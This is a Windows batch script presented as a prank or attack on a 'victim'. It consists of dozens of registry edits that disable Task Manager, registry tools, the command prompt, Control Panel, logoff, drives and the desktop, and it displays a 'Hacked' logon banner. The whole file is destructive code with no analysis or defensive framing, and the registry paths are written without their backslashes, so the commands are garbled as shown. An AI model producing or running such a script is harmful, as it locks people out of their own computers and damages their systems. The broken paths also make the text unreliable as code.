: Smash the stack for fun and profit
: This will just kill some resources in such a way that the victim will get very annoyed.
: This batch file will give a hard blow to the registry.
@echo off

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoControlPanel /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoRun /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoToolbarsOnTaskbar /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSetTaskBar /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoViewContextMenu /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoTrayContextMenu /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoStartMenuMorePrograms /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSetFolders /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSecurityTab /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoLogOff /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoFind /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoDrives /t REG_DWORD /d 03ffffff

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoClose /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoNetHood /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoNetworkConnections /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoDesktop /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v StartMenuLogOff /t REG_DWORD /d 00000000

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v ClassicShell /t REG_DWORD /d 00000000

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSMMyDocs /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSMHelp /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSMConfigurePrograms /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoStartMenuMyMusic /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoSMMyPictures /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoRecentDocsMenu /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoFavoritesMenu /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoStartMenuPinnedList /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoActiveDesktop /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoTrayItemsDisplay /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableRegistryTools /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableChangePassword /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableLockWorkstation /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v NoDispCPL /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v NoDispBackgroundPage /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v NoDispScrSavPage /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v NoDispAppearancePage /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v NoDispSettingsPage /t REG_DWORD /d 00000001

reg add HKCUSoftwarePoliciesMicrosoftWindowsSystem /v DisableCMD /t REG_DWORD /d 00000002

reg add HKLMSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v legalnoticecaption /d Oops..

reg add HKLMSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v legalnoticetext /d …Hacked…

reg add HKCUSoftwarePoliciesMicrosoftMMC /v RestrictToPermittedSnapins /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced /v Start_ShowPrinters /t REG_DWORD /d 00000000

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced /v Start_AdminToolsRoot /t REG_DWORD /d 00000000

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced /v Start_ShowMyComputer /t REG_DWORD /d 00000000

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced /v WebView /t REG_DWORD /d 00000000

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesUninstall /v NoAddRemovePrograms /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesUninstall /v NoAddPage /t REG_DWORD /d 00000001

reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesUninstall /v NoRemovePage /t REG_DWORD /d 00000001

reg add HKCUControl PanelInternational /v sTimeFormat /d H:mm:ss

reg add HKU.DEFAULTSoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced /v WebView /t REG_DWORD /d 00000000

exit